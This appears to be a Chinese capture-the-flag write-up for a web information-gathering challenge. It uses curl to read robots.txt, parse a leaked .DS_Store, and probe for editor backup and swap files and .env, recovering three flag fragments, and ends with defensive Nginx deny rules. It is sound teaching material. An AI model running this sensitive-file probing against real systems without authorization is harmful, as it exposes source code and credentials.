- **类型**: WEB（信息搜集）

## 信息收集

### 1. 访问目标页面

首先使用 `curl` 获取目标页面的 HTTP 响应头和页面内容：

```bash
curl -s -i https://f129ecc57757e65289c300d6.http-ctf2.dasctf.com/
```

**返回结果（关键部分）：**
```
HTTP/2 200
server: openresty
x-powered-by: PHP/7.4.10
content-type: text/html; charset=UTF-8

<!DOCTYPE html>
<!-- saved from url=(0031)https://bootswatch.com/sketchy/ -->
<html lang="en">
<head>
    <title>敏感文件</title>
    ...
</head>
<body>
    <div class="container">
        <h1 id="containers">敏感文件</h1>
        <h1 class="display-3">Hello, CTFer!</h1>

```

**分析：**

- 页面引用了 `Bootswatch_ Sketchy_files/` 目录下的 CSS 和 JS 文件

### 2. 检查 robots.txt

`robots.txt` 是网站的爬虫协议文件，经常包含敏感路径信息：

```bash
curl -s -i https://f129ecc57757e65289c300d6.http-ctf2.dasctf.com/robots.txt
```

**返回结果：**
```
HTTP/2 200
content-type: text/plain

User-agent: *
Disallow:
/flag1_is_her3_fun.txt
```

**分析：** `robots.txt` 泄露了一个敏感文件路径 `/flag1_is_her3_fun.txt`。

### 3. 获取 Flag1

访问 `robots.txt` 中泄露的文件路径：

```bash
curl -s https://f129ecc57757e65289c300d6.http-ctf2.dasctf.com/flag1_is_her3_fun.txt
```

**返回结果：**
```
flag1:n1book{info_1
```

**Flag1**: `n1book{info_1`（这是 flag 的第一部分）

### 4. 检查 .DS_Store 文件

`.DS_Store`（Desktop Services Store）是 macOS 系统中 Finder 用来存储文件夹显示属性的隐藏文件。如果开发者在部署网站时没有删除这个文件，它会泄露服务器上的目录结构信息。

```bash
curl -s -o /tmp/.DS_Store https://f129ecc57757e65289c300d6.http-ctf2.dasctf.com/.DS_Store
```

确认文件存在并下载成功：

```bash
curl -s -i https://f129ecc57757e65289c300d6.http-ctf2.dasctf.com/.DS_Store
```

**返回结果：**
```
HTTP/2 200
content-type: application/octet-stream
content-length: 10244
```

使用 Python 解析 `.DS_Store` 文件，提取目录信息：

```bash
pip3 install ds_store
python3 -c "
from ds_store import DSStore
with DSStore.open('/tmp/.DS_Store', 'r') as d:
    for entry in d:
        print(f'name={entry.filename}, type={entry.type}, code={entry.code}')
"
```

**返回结果：**
```
name=Bootswatch_ Sketchy_files, type=<class 'ds_store.store.PlistCodec'>, code=b'bwsp'
name=Bootswatch_ Sketchy_files, type=b'bool', code=b'dscl'
name=Bootswatch_ Sketchy_files, type=b'blob', code=b'lsvC'
name=Bootswatch_ Sketchy_files, type=<class 'ds_store.store.PlistCodec'>, code=b'lsvp'
name=Bootswatch_ Sketchy_files, type=b'long', code=b'vSrn'
```

**分析：** `.DS_Store` 文件揭示了服务器上存在 `Bootswatch_ Sketchy_files` 目录，这与页面 HTML 源码中引用的资源路径一致。

### 5. 检查备份文件（Emacs backup file）

在信息搜集过程中，常见的敏感文件还包括编辑器的备份文件。Emacs 编辑器在编辑文件时会生成 `~` 结尾的备份文件（如 `index.php~`），Vim 编辑器会生成 `.swp` 结尾的交换文件。

批量检查常见的备份文件：

```bash
for f in "index.php~" ".index.php.swp" "index.php.swp" "index.php.save" "index.php.bak" "config.php" "config.php.bak" ".env"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://f129ecc57757e65289c300d6.http-ctf2.dasctf.com/$f")
  echo "$f -> $code"
done
```

**返回结果：**
```
index.php~ -> 200          # 存在！
.index.php.swp -> 200      # 存在！
index.php.swp -> 404
index.php.save -> 404
index.php.bak -> 404
config.php -> 404
config.php.bak -> 404
.env -> 404
```

**分析：** 发现两个备份文件存在：
- `index.php~`（Emacs 备份文件）
- `.index.php.swp`（Vim 交换文件）

### 6. 获取 Flag2（从 Emacs 备份文件）

访问 Emacs 备份文件：

```bash
curl -s https://f129ecc57757e65289c300d6.http-ctf2.dasctf.com/index.php~
```

**返回结果（关键部分）：**
```html
...
<h1 class="display-3">Hello, CTFer!</h1>
<p class="lead">信息搜集之所以重要，是因为其往往会带给我们一些意想不到的东西</p>
<hr class="my-4">
<p>hack fun</p>
<p>flag2:s_v3ry_im
...
```

**Flag2**: `s_v3ry_im`（这是 flag 的第二部分）

**漏洞原理：** `index.php~` 是 Emacs 编辑器自动生成的备份文件。开发者在编辑 `index.php` 后，Emacs 会在同目录下生成一个以 `~` 结尾的备份文件。如果部署时没有删除这些备份文件，攻击者可以直接访问并获取源码内容，其中可能包含敏感信息（如 flag、数据库密码等）。

### 7. 获取 Flag3（从 Vim 交换文件）

下载 Vim 交换文件并提取内容：

```bash
curl -s -o /tmp/.index.php.swp https://f129ecc57757e65289c300d6.http-ctf2.dasctf.com/.index.php.swp
```

查看文件类型：

```bash
file /tmp/.index.php.swp
```

**返回结果：**
```
/tmp/.index.php.swp: Vim swap file, version 8.0, pid 10791, user venenof, host happy, file ~venenof/Desktop/出题/backup/index.php, modified
```

**分析：** 这是一个 Vim 8.0 的交换文件，用户名为 `venenof`，主机名为 `happy`，原始文件路径为 `~venenof/Desktop/出题/backup/index.php`。

从交换文件中提取字符串（即原始文件内容）：

```bash
strings /tmp/.index.php.swp
```

**返回结果（关键部分）：**
```php
<?php echo 'flag3:p0rtant_hack}';?>
<p>hack fun</p>
<hr class="my-4">
<p class="lead">信息搜集之所以重要，是因为其往往会带给我们一些意想不到的东西</p>
<h1 class="display-3">Hello, CTFer!</h1>
```

**Flag3**: `p0rtant_hack}`（这是 flag 的第三部分）

**漏洞原理：** `.index.php.swp` 是 Vim 编辑器在编辑文件时自动创建的交换文件（swap file）。交换文件用于崩溃恢复，包含文件的完整内容。Vim 正常退出时会删除交换文件，但如果 Vim 异常退出（如崩溃、强制关闭），交换文件会残留在服务器上。攻击者可以通过访问 `.index.php.swp` 文件获取原始 PHP 源码。

## 漏洞分析

### 信息搜集类漏洞原理

本题考察的是 **敏感文件泄露** 漏洞，属于信息搜集（Information Gathering）范畴。信息搜集是渗透测试的第一步，通过收集目标系统的各种信息，可以发现潜在的攻击面。

### 涉及的三种敏感文件

#### 1. robots.txt 泄露

- **文件性质**：`robots.txt` 是网站根目录下的文本文件，用于告诉搜索引擎爬虫哪些页面可以抓取、哪些不可以
- **泄露原因**：管理员在配置禁止爬取的路径时，往往会暴露敏感目录或文件的路径
- **风险等级**：中等。虽然不能直接获取文件内容，但可以引导攻击者发现敏感文件

#### 2. Emacs 备份文件（~）

- **文件性质**：Emacs 编辑器在编辑文件时会自动生成以 `~` 结尾的备份文件（如 `index.php~`）
- **泄露原因**：开发者编辑完文件后没有删除备份文件，且 Web 服务器没有配置禁止访问备份文件
- **风险等级**：高。备份文件包含源码的完整内容，可能泄露敏感信息

#### 3. Vim 交换文件（.swp）

- **文件性质**：Vim 编辑器在编辑文件时会创建以 `.swp` 结尾的交换文件（如 `.index.php.swp`），用于崩溃恢复
- **泄露原因**：Vim 异常退出后交换文件残留在服务器上
- **风险等级**：高。交换文件包含源码的完整内容，且文件名以 `.` 开头（隐藏文件），容易被忽视

### 其他常见的敏感文件

除了本题涉及的文件外，常见的敏感文件还包括：

| 文件/目录 | 说明 |
|-----------|------|
| `.git/` | Git 版本控制目录，可还原源码 |
| `.svn/` | SVN 版本控制目录 |
| `.DS_Store` | macOS 目录元数据文件 |
| `www.zip` / `backup.zip` | 网站备份压缩包 |
| `.env` | 环境变量配置文件（含数据库密码等） |
| `phpinfo.php` | PHP 信息页面 |
| `.bash_history` | Bash 命令历史记录 |
| `web.config` | IIS 配置文件 |
| `crossdomain.xml` | Flash 跨域策略文件 |

## 知识点总结

### 涉及的技术点

1. **robots.txt 分析**：检查网站爬虫协议文件，发现隐藏路径
2. **.DS_Store 文件解析**：提取 macOS 目录元数据，获取目录结构
3. **编辑器备份文件利用**：获取 Emacs 备份文件（`~`）和 Vim 交换文件（`.swp`）中的源码
4. **信息搜集方法论**：系统性地检查常见敏感文件

### 用到的工具及说明

| 工具 | 用途 |
|------|------|
| `curl` | 发送 HTTP 请求，获取页面内容和响应头 |
| `file` | 识别文件类型（确认是 Vim swap 文件） |
| `strings` | 从二进制文件中提取可读字符串 |
| `python3 + ds_store` | 解析 .DS_Store 文件，提取目录信息 |
| `gobuster` | 目录枚举扫描 |

### 防御建议

1. **删除敏感文件**：部署前删除 `.DS_Store`、编辑器备份文件（`*.~`、`.*.swp`、`.*.swo`）、版本控制目录（`.git/`、`.svn/`）
2. **配置 Web 服务器**：
   - 在 Nginx/Apache 中禁止访问隐藏文件和常见备份文件
   - 示例 Nginx 配置：
     ```nginx
     location ~ /\. {
         deny all;
     }
     location ~ ~$ {
         deny all;
     }
     location ~ \.swp$ {
         deny all;
     }
     ```
3. **使用 `.gitignore`**：将敏感文件添加到 `.gitignore` 中
4. **配置编辑器**：修改编辑器配置，将备份文件和交换文件存储在项目目录之外
5. **定期安全审计**：使用自动化工具定期扫描服务器上的敏感文件
